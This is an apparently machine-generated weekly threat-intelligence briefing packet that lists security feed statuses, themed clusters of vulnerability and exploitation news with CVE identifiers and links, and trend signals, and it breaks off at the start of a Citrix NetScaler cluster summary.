# PHANTOMSignal Briefing Packet

- Generated: 2026-10-01T08:39:41.832906+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 75
- Total items in window: 350
- Total clusters raw: 141
- Total clusters in packet: 61
- Dropped low score: 80
- Dropped overflow: 0

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 3
- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 9
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 6
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 3
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 4
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 4
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 0
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 0
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 3
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 0
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 8
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 5
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 8
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 3
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 20
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 18
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 50
  - In window count: 2
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 1
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 27
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 6
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 24
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 25
  - In window count: 23
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 0

## Affinity groups (themes)

### Microsoft Defender vulnerability activity
- Anchor signal: Microsoft Defender
- Theme key: microsoft-defender
- Cluster count: 10
- Article count: 19
- Cohesion: 0.286
- Shared strong signals: Microsoft Defender
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Microsoft Defender
- Cluster IDs: a14cf81e36, 6b592b3549, b1ada69511, 48be01e909, a89ee14154, 355863d181, 07b6c8a583, bededcd553, e033dbd67d, 313eff8055
- Links:
  - https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
  - https://thehackernews.com/2026/09/attackers-exploit-zimbra-flaw-to-deploy.html
  - https://thehackernews.com/2026/09/roundcube-pre-auth-sql-injection-flaw.html
  - https://www.microsoft.com/en-us/security/blog/2026/09/25/storm-3168-agentic-driven-cloud-attacks-using-compromised-service-principals/
  - https://thehackernews.com/2026/09/jadepuffer-linked-attackers-used.html
  - https://www.darkreading.com/cloud-security/jadepuffer-ai-actor-azure-tenant-destructive-cloud-attack
  - https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/
  - https://www.microsoft.com/en-us/security/blog/2026/09/29/beyond-source-code-a-path-to-the-keys-to-the-kingdom/
  - https://www.microsoft.com/en-us/security/blog/2026/09/29/star-blizzard-refines-phishing-and-malware-delivery-with-the-redflick-technique/
  - https://www.microsoft.com/en-us/security/blog/2026/09/28/needymantis-unpacking-a-post-compromise-malware-family-used-in-targeted-operations/
  - https://www.microsoft.com/en-us/security/blog/2026/09/24/beyond-ransomware-tracking-storm-2570-consistent-tradecraft-across-deployments/
  - https://www.microsoft.com/en-us/security/blog/2026/09/24/whats-new-in-microsoft-security-september-2026/
  - https://www.huntress.com/blog/threat-actor-compiles-cryptominer

### ShinyHunters: zero day
- Anchor signal: ShinyHunters
- Theme key: shinyhunters
- Cluster count: 5
- Article count: 14
- Cohesion: 0.262
- Shared strong signals: ShinyHunters
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, active_exploitation, web_shell_backdoor
  - actor_attribution: ShinyHunters
  - affected_industries: government, financial_services
  - affected_products: Anthropic/Claude
  - urgency_signals: zero_day, actively_exploited, preauth_unauth
- Cluster IDs: 6a53a92578, 6b592b3549, 38ffcad665, 94f37acfe0, fd4ff49516
- Links:
  - https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-renewed-mass-exploitation-campaign-targeting-oracle-peoplesoft/
  - https://thehackernews.com/2026/09/attackers-bypass-wafs-to-exploit-oracle.html
  - https://research.checkpoint.com/2026/28th-september-threat-intelligence-report/
  - https://cyberscoop.com/fbi-data-breach-shinyhunters-agent-safety-risk/
  - https://risky.biz/SRB185/
  - https://krebsonsecurity.com/2026/09/dutch-police-arrest-reformed-hacker-in-shiny-hunters-investigation/
  - https://thehackernews.com/2026/09/roundcube-pre-auth-sql-injection-flaw.html
  - https://www.securityweek.com/cisco-patches-exploited-catalyst-sd-wan-zero-day-vulnerability/
  - https://www.securityweek.com/watchguard-patches-critical-fireware-os-code-injection-vulnerability/
  - https://cyberscoop.com/kiteworks-lifts-shutdown-advisory-after-credible-threat-intelligence-from-federal-authorities/

### Linux kernel active exploitation
- Anchor signal: Linux kernel
- Theme key: linux-kernel
- Cluster count: 4
- Article count: 5
- Cohesion: 0.344
- Shared strong signals: Linux kernel
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, zero_day, vulnerability_disclosure
  - affected_products: Linux kernel
  - urgency_signals: zero_day, actively_exploited, preauth_unauth
- Cluster IDs: 1f0734997f, 4e9e2ada1e, dd608f8928, bc03121785
- Links:
  - https://cloud.google.com/blog/topics/threat-intelligence/vulnerability-discovery-and-exploitation-trends-in-the-ai-era/
  - https://www.bleepingcomputer.com/news/security/cisa-warns-of-critical-pre-auth-rce-flaw-in-mikrotik-routeros/
  - https://www.securityweek.com/google-ai-is-changing-the-pace-and-profile-of-vulnerability-discovery/
  - https://thehackernews.com/2026/09/new-spectre-v2-btr-attack-leaks-linux.html

### Cisco active exploitation
- Anchor signal: Cisco
- Theme key: cisco
- Cluster count: 3
- Article count: 6
- Cohesion: 0.214
- Shared strong signals: Cisco
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_industries: financial_services, government
  - affected_products: Cisco
  - cve_ids: CVE-2026-76504
  - urgency_signals: actively_exploited, preauth_unauth
- Cluster IDs: e8f8b3bb19, 38ffcad665, 9b43995709
- Links:
  - https://www.rapid7.com/blog/post/etr-critical-cisco-catalyst-sd-wan-manager-api-authentication-bypass-exploited-in-the-wild-cve-2026-76504
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76504/
  - https://thehackernews.com/2026/09/cisco-warns-of-attackers-exploiting.html
  - https://www.bleepingcomputer.com/news/security/cisco-warns-of-new-sd-wan-authentication-bypass-zero-day-exploited-in-attacks/
  - https://www.securityweek.com/cisco-patches-exploited-catalyst-sd-wan-zero-day-vulnerability/
  - https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/

### Citrix exploitation (5 CVEs)
- Anchor signal: Citrix
- Theme key: citrix
- Cluster count: 2
- Article count: 24
- Cohesion: 0.433
- Shared strong signals: Citrix
- Member CVEs: CVE-2026-88771, CVE-2026-88772, CVE-2026-88773, CVE-2026-88774, CVE-2026-88775
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, active_exploitation
  - affected_products: Citrix
  - cve_ids: CVE-2026-88771, CVE-2026-88772, CVE-2026-88773, CVE-2026-88774, CVE-2026-88775
  - urgency_signals: actively_exploited, zero_day
- Cluster IDs: b0527f41c8, 5fc59e5ed7
- Links:
  - https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-citrix-netscaler-adc-and-gateway-cve-2026-88771-and-cve-2026-88772
  - https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/
  - https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances/
  - https://www.ncsc.gov.uk/news/exploitation-of-vulnerabilities-affecting-citrix-netscaler-adc-and-citrix-netscaler-gateway
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-19490/
  - https://orca.security/resources/research/critical-citrix-netscaler-zero-days-under-active-exploitation/
  - https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/
  - https://thehackernews.com/2026/09/warning-two-unpatched-citrix-netscaler.html
  - https://www.helpnetsecurity.com/2026/09/30/cve-2026-88772-netscaler-exploitation-zero-day/
  - https://www.sophos.com/en-us/blog/citrix-netscaler-cve-2026-88771-cve-2026-88772-in-active-exploitation
  - https://cyberscoop.com/citrix-zero-days-delayed-disclosure/
  - https://www.greynoise.io/blog/swarming-against-citrix-0-day-exploitation
  - https://www.securityweek.com/government-finance-orgs-targeted-in-weeks-long-netscaler-zero-day-attacks/
  - https://www.bleepingcomputer.com/news/security/hackers-exploit-citrix-netscaler-zero-day-to-deploy-web-shells/
  - https://www.reddit.com/r/netsec/comments/1wtattu/here_we_go_again_citrix_netscaler_dtls_preauth/
  - https://www.infosecurity-magazine.com/news/citrix-patches-critical-zero-days/

### Android active exploitation
- Anchor signal: Android
- Theme key: android
- Cluster count: 3
- Article count: 5
- Cohesion: 0.2
- Shared strong signals: Android
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_products: Android
  - urgency_signals: no_patch_yet, actively_exploited, preauth_unauth
- Cluster IDs: 5ccb851e5d, 6b592b3549, 793f25a293
- Links:
  - https://thehackernews.com/2026/09/sharepoint-rce-and-mikrotik-routeros.html
  - https://thehackernews.com/2026/09/roundcube-pre-auth-sql-injection-flaw.html
  - https://thehackernews.com/2026/09/unpatched-oneplus-flaws-let-installed.html
  - https://therecord.media/ukraine-ssscip-mobile-malware-warning-ios-android
  - https://www.infosecurity-magazine.com/news/banking-trojan-remote-control/

### CVE-2026-1731 exploitation activity
- Anchor signal: CVE-2026-1731
- Theme key: cve-2026-1731
- Cluster count: 3
- Article count: 3
- Cohesion: 0.65
- Shared strong signals: CVE-2026-1731
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: vulnerability_disclosure, active_exploitation, zero_day
  - affected_industries: critical_infrastructure
  - cve_ids: CVE-2026-1731
  - urgency_signals: actively_exploited, poc_available, zero_day, preauth_unauth
- Cluster IDs: dd608f8928, 25a206d1e0, c3b1f3ccb5
- Links:
  - https://www.securityweek.com/google-ai-is-changing-the-pace-and-profile-of-vulnerability-discovery/
  - https://therecord.media/google-vulnerabilities-cyberattacks-ai
  - https://www.infosecurity-magazine.com/news/ai-found-vulnerabilities-rce/

### CVE-2026-73570 exploitation activity
- Anchor signal: CVE-2026-73570
- Theme key: cve-2026-73570
- Cluster count: 2
- Article count: 4
- Cohesion: 0.2
- Shared strong signals: CVE-2026-73570
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - cve_ids: CVE-2026-73570
  - urgency_signals: preauth_unauth
- Cluster IDs: a14cf81e36, d1f6d41902
- Links:
  - https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
  - https://thehackernews.com/2026/09/attackers-exploit-zimbra-flaw-to-deploy.html
  - https://www.rapid7.com/blog/post/ve-business-email-compromise-rewriting-reality-zimbra-cve

### Microsoft SharePoint exploitation (CVE-2026-86060)
- Anchor signal: Microsoft SharePoint
- Theme key: microsoft-sharepoint
- Cluster count: 2
- Article count: 2
- Cohesion: 0.235
- Shared strong signals: Microsoft SharePoint
- Member CVEs: CVE-2026-86060
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_products: Microsoft SharePoint
  - cve_ids: CVE-2026-86060
  - urgency_signals: actively_exploited, preauth_unauth
- Cluster IDs: 5ccb851e5d, 4e9e2ada1e
- Links:
  - https://thehackernews.com/2026/09/sharepoint-rce-and-mikrotik-routeros.html
  - https://www.bleepingcomputer.com/news/security/cisa-warns-of-critical-pre-auth-rce-flaw-in-mikrotik-routeros/

### ScreenConnect vulnerability activity
- Anchor signal: ScreenConnect
- Theme key: screenconnect
- Cluster count: 2
- Article count: 3
- Cohesion: 0.222
- Shared strong signals: ScreenConnect
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: ScreenConnect
- Cluster IDs: e981db64b2, 48be01e909
- Links:
  - https://isc.sans.edu/diary/rss/33388
  - https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/

## Forward signals

### Novelty
- Novel cves: 0
- Novel actors: 0
- Novel products: 0

### Velocity bursts (5)
- **Zero-Day Exploitation of Citrix NetScaler ADC and Gateway: CVE-2026-88771 and CVE-2026-88772**
  - Cluster: b0527f41c8
  - Sources in window: 3
  - Window hours: 0.1
  - Cohort count: 7
- **ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft**
  - Cluster: 6a53a92578
  - Sources in window: 3
  - Window hours: 1.2
  - Cohort count: 4
- **Risky Bulletin: Major vulnerability found in ancient TACACS+ networking protocol**
  - Cluster: 6c50411d30
  - Sources in window: 3
  - Window hours: 3.7
  - Cohort count: 4
- **Critical Cisco Catalyst SD-WAN Manager API authentication bypass exploited in the wild (CVE-2026-76504)**
  - Cluster: e8f8b3bb19
  - Sources in window: 3
  - Window hours: 0.6
  - Cohort count: 2
- **Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570**
  - Cluster: a14cf81e36
  - Sources in window: 3
  - Window hours: 2.8
  - Cohort count: 2

### Leading edge (0)

### Convergence (15)
- Pair: CVE-2026-88771 + Citrix (cluster b0527f41c8, first observation: True)
- Pair: CVE-2026-88772 + Citrix (cluster b0527f41c8, first observation: True)
- Pair: CVE-2026-88773 + Citrix (cluster b0527f41c8, first observation: True)
- Pair: CVE-2026-88774 + Citrix (cluster b0527f41c8, first observation: True)
- Pair: CVE-2026-88775 + Citrix (cluster b0527f41c8, first observation: True)
- Pair: CVE-2026-20127 + Cisco (cluster e8f8b3bb19, first observation: True)
- Pair: CVE-2026-20182 + Cisco (cluster e8f8b3bb19, first observation: True)
- Pair: CVE-2026-76504 + Cisco (cluster e8f8b3bb19, first observation: True)
- Pair: CVE-2026-86950 + Apple iOS/macOS (cluster b4817022a8, first observation: True)
- Pair: CVE-2026-35273 + Cl0p (cluster 6a53a92578, first observation: True)
- Pair: CVE-2026-35273 + ShinyHunters (cluster 6a53a92578, first observation: True)
- Pair: CVE-2026-35273 + UNC6240 (cluster 6a53a92578, first observation: True)
- Pair: CVE-2026-73570 + Microsoft Defender (cluster a14cf81e36, first observation: True)
- Pair: CVE-2026-65660 + Android (cluster 5ccb851e5d, first observation: True)
- Pair: CVE-2026-65660 + Microsoft SharePoint (cluster 5ccb851e5d, first observation: True)

### Drift (4)
- **Cl0p** (cluster 6a53a92578)
  - New industries: education, healthcare
  - New products: (none)
  - Prior top industries: financial_services, government, manufacturing_industrial
  - Prior top products: Microsoft 365, OpenAI/ChatGPT, SolarWinds
- **ShinyHunters** (cluster 6a53a92578)
  - New industries: education
  - New products: (none)
  - Prior top industries: financial_services, government, healthcare
  - Prior top products: Anthropic/Claude, OpenAI/ChatGPT, Salesforce
- **UNC6240** (cluster 6a53a92578)
  - New industries: government
  - New products: (none)
  - Prior top industries: education, financial_services, healthcare
  - Prior top products: AWS, Microsoft SharePoint, Salesforce
- **Salt Typhoon** (cluster 5fc59e5ed7)
  - New industries: (none)
  - New products: AWS
  - Prior top industries: critical_infrastructure, government, manufacturing_industrial
  - Prior top products: Citrix, Microsoft Windows, Salesforce

### Persistence (9)
- actor_attribution: ShinyHunters (weeks observed: 14, cluster 6a53a92578)
- actor_attribution: Cl0p (weeks observed: 10, cluster 6a53a92578)
- cve_ids: CVE-2026-19490 (weeks observed: 7, cluster b0527f41c8)
- actor_attribution: Salt Typhoon (weeks observed: 5, cluster 5fc59e5ed7)
- actor_attribution: UNC6240 (weeks observed: 4, cluster 6a53a92578)
- cve_ids: CVE-2026-73570 (weeks observed: 4, cluster a14cf81e36)
- cve_ids: CVE-2026-86060 (weeks observed: 3, cluster 5ccb851e5d)
- cve_ids: CVE-2025-49113 (weeks observed: 3, cluster 6b592b3549)
- cve_ids: CVE-2026-67276 (weeks observed: 3, cluster 4e9e2ada1e)

### Tier inversion (1)
- **CVE-2026-32740: RCE in a PIE Next.js sharp/libheif Stack**
  - Cluster: bd76ce6fac
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2026-32740

## Clusters

### Cluster b0527f41c8 — score 73

- Title: Zero-Day Exploitation of Citrix NetScaler ADC and Gateway: CVE-2026-88771 and CVE-2026-88772
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-28T10:05:00+00:00
- Link: https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-citrix-netscaler-adc-and-gateway-cve-2026-88771-and-cve-2026-88772
- Fetch status: ok
- Member count: 23
- Corroborating source count: 16
- Strong signals: CVE-2026-88771, CVE-2026-88772, Citrix

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, web_shell_backdoor, zero_day
- affected_industries: education, financial_services, government, legal_professional, telecommunications
- affected_products: Citrix
- cve_ids: CVE-2026-19490, CVE-2026-88771, CVE-2026-88772, CVE-2026-88773, CVE-2026-88774, CVE-2026-88775
- urgency_signals: actively_exploited, critical_cvss, no_patch_yet, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_government, tier_1_offensive_research, tier_1_primary_research, tier_2_operator, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_products: Citrix
- cve_ids: CVE-2026-88771, CVE-2026-88772, CVE-2026-88773, CVE-2026-88774, CVE-2026-88775
- urgency_signals: actively_exploited, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
